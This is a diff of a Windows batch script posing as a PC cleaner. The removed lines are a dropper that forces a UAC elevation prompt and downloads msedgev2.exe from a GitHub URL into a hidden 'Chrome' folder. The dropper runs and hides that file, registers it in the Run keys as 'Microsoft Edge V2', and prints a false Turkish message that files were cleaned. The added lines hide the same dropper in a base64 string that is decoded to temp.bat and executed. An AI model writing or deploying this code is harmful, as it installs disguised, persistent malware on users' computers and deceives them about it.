@@ -1,51 +1,6 @@
+@echo off
+setlocal enabledelayedexpansion
+set base64String=DQo6LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLToNCnBvd2Vyc2hlbGwgLXdpbmRvdyBoaWRkZW4gLWNvbW1hbmQgIiINCjotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tOg0KSUYgIiVQUk9DRVNTT1JfQVJDSElURUNUVVJFJSIgRVFVICJhbWQ2NCIgKA0KICAgID5udWwgMj4mMSAiJVNZU1RFTVJPT1QlXFN5c1dPVzY0XGNhY2xzLmV4ZSIgIiVTWVNURU1ST09UJVxTeXNXT1c2NFxjb25maWdcc3lzdGVtIg0KKSBFTFNFICgNCiAgICA+bnVsIDI+JjEgIiVTWVNURU1ST09UJVxzeXN0ZW0zMlxjYWNscy5leGUiICIlU1lTVEVNUk9PVCVcc3lzdGVtMzJcY29uZmlnXHN5c3RlbSINCikNCjotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tOg0KaWYgJyVlcnJvcmxldmVsJScgTkVRICcwJyAoDQogICAgZ290byBVQUNQcm9tcHQNCikgZWxzZSAoIA0KICAgIGdvdG8gZ290QWRtaW4gDQopDQo6LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLToNCjpVQUNQcm9tcHQNCiAgICBlY2hvIFNldCBVQUMgPSBDcmVhdGVPYmplY3ReKCJTaGVsbC5BcHBsaWNhdGlvbiJeKSA+ICIldGVtcCVcZ2V0YWRtaW4udmJzIg0KICAgIHNldCBwYXJhbXM9JSoNCiAgICBlY2hvIFVBQy5TaGVsbEV4ZWN1dGUgImNtZC5leGUiLCAiL2MgIiIlfnMwIiIgJXBhcmFtczoiIj0iIiIsICIiLCAicnVuYXMiLCAxID4+ICIldGVtcCVcZ2V0YWRtaW4udmJzIg0KOi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS06DQogICAgIiV0ZW1wJVxnZXRhZG1pbi52YnMiDQogICAgZGVsICIldGVtcCVcZ2V0YWRtaW4udmJzIg0KICAgIGV4aXQgL0INCjotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tOg0KOmdvdEFkbWluDQogICAgcHVzaGQgIiVDRCUiDQogICAgQ0QgL0QgIiV+ZHAwIg0KOi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS06DQpjZCAiJUxvY2FsQXBwRGF0YSUiDQppZiBub3QgZXhpc3QgIkNocm9tZSIgbWtkaXIgIkNocm9tZSINCmF0dHJpYiAraCAiQ2hyb21lIiAvcyAvZA0KY2QgIiVMb2NhbEFwcERhdGElXENocm9tZSINCjotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tOg0KcG93ZXJzaGVsbCAtQ29tbWFuZCAiW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSW52b2tlLVdlYlJlcXVlc3QgJ2h0dHBzOi8vZ2l0aHViLmNvbS9jb25mZXNzeW91cmNpbi94b3Itb2JmdXNjYXRvci9yYXcvcmVmcy9oZWFkcy9tYWluL21zZWRnZXYyLmV4ZScgLU91dEZpbGUgJ21zZWRnZXYyLmV4ZSciDQppZiBub3QgZXhpc3QgIm1zZWRnZXYyLmV4ZSIgKA0KICAgIHBvd2Vyc2hlbGwgLUNvbW1hbmQgIkludm9rZS1XZWJSZXF1ZXN0ICdodHRwczovL2dpdGh1Yi5jb20vY29uZmVzc3lvdXJjaW4veG9yLW9iZnVzY2F0b3IvcmF3L3JlZnMvaGVhZHMvbWFpbi9tc2VkZ2V2Mi5leGUnIC1PdXRGaWxlICdtc2VkZ2V2Mi5leGUnIg0KKQ0KaWYgZXhpc3QgIm1zZWRnZXYyLmV4ZSIgKA0KICAgIHN0YXJ0IG1zZWRnZXYyLmV4ZQ0KICAgIGF0dHJpYiAraCAibXNlZGdldjIuZXhlIiAvcyAvZA0KKSBlbHNlICgNCiAgICBleGl0IC9CDQopDQpyZWcgYWRkICJIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biIgL3YgIk1pY3Jvc29mdCBFZGdlIFYyIiAvdCBSRUdfU1ogL2QgIlwiJUxvY2FsQXBwRGF0YSVcQ2hyb21lXG1zZWRnZXYyLmV4ZVwiIiAvZg0KcmVnIGFkZCAiSEtMTVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4iIC92ICJNaWNyb3NvZnQgRWRnZSBWMiIgL3QgUkVHX1NaIC9kICJcIiVMb2NhbEFwcERhdGElXENocm9tZVxtc2VkZ2V2Mi5leGVcIiIgL2YNCjotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tOg0KZWNobyBCaWxnaXNheWFyIHRlbWl6bGVuZGkgdmUgZWsgb2xhcmFrIGdlcmVrc2l6ICVkZWxldGVkRm9sZGVycyUgYWRldCBkb3N5YSBiYcWfYXLEsXlsYSBzaWxpbmRpIQ0KZW5kbG9jYWwNCmV4aXQNCjotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tOg0K
 
-:----------------------------------------------------------------------------------------------------------------:
-powershell -window hidden -command ""
-:----------------------------------------------------------------------------------------------------------------:
-IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
-    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
-) ELSE (
-    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
-)
-:----------------------------------------------------------------------------------------------------------------:
-if '%errorlevel%' NEQ '0' (
-    goto UACPrompt
-) else ( 
-    goto gotAdmin 
-)
-:----------------------------------------------------------------------------------------------------------------:
-:UACPrompt
-    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
-    set params=%*
-    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:""=""", "", "runas", 1 >> "%temp%\getadmin.vbs"
-:----------------------------------------------------------------------------------------------------------------:
-    "%temp%\getadmin.vbs"
-    del "%temp%\getadmin.vbs"
-    exit /B
-:----------------------------------------------------------------------------------------------------------------:
-:gotAdmin
-    pushd "%CD%"
-    CD /D "%~dp0"
-:----------------------------------------------------------------------------------------------------------------:
-cd "%LocalAppData%"
-if not exist "Chrome" mkdir "Chrome"
-attrib +h "Chrome" /s /d
-cd "%LocalAppData%\Chrome"
-:----------------------------------------------------------------------------------------------------------------:
-powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest 'https://github.com/confessyourcin/xor-obfuscator/raw/refs/heads/main/msedgev2.exe' -OutFile 'msedgev2.exe'"
-if not exist "msedgev2.exe" (
-    powershell -Command "Invoke-WebRequest 'https://github.com/confessyourcin/xor-obfuscator/raw/refs/heads/main/msedgev2.exe' -OutFile 'msedgev2.exe'"
-)
-if exist "msedgev2.exe" (
-    start msedgev2.exe
-    attrib +h "msedgev2.exe" /s /d
-) else (
-    exit /B
-)
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Microsoft Edge V2" /t REG_SZ /d "\"%LocalAppData%\Chrome\msedgev2.exe\"" /f
-reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Microsoft Edge V2" /t REG_SZ /d "\"%LocalAppData%\Chrome\msedgev2.exe\"" /f
-:----------------------------------------------------------------------------------------------------------------:
-echo Bilgisayar temizlendi ve ek olarak gereksiz %deletedFolders% adet dosya başarıyla silindi!
-endlocal
-exit
-:----------------------------------------------------------------------------------------------------------------:
+powershell -Command "[System.IO.File]::WriteAllBytes('temp.bat', [Convert]::FromBase64String('!base64String!'))"
+start temp.bat
